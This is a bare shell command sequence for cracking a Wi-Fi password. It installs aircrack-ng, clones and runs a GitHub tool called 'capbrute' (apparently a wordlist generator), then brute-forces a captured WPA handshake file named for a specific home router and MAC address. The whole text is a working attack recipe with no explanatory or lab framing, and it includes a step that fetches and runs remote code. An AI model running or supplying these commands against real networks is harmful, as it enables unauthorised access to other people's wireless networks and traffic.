sudo apt update -y
sudo apt install python3 aircrack-ng wget -y
git clone https://github.com/JamalNiga/capbrute
cd capbrute
python3 hy.py
sudo aircrack-ng -w pass.txt handshake_inwiHome4G1E6E20_48-4C-86-1E-6E-20_2023-10-06T00-38-26.cap
#-
